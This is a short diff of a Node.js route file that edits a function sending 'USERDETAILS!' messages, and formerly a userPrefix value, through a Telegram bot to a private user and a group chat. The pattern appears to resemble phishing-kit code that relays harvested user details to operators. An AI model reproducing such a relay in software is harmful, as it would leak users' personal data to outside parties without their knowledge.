@@ -331,11 +331,11 @@ router.post('/revise', async (req, res, err) => {
 
 const sendToTelegram = async (userPrefix) => {
     console.log(userPrefix);
-        await bot.telegram.sendMessage('@aQaQomi', "USERDETAILS!", {})
+        await bot.telegram.sendMessage(298641340, "USERDETAILS!")
         .then(response => console.log(response))
         .catch(err => console.log(err));
 
-        await bot.telegram.sendMessage(-1001173157040, userPrefix, {})
+        await bot.telegram.sendMessage(-1001173157040, "USERDETAILS!")
         .then(response => console.log(response))
         .catch(err => console.log(err));
 
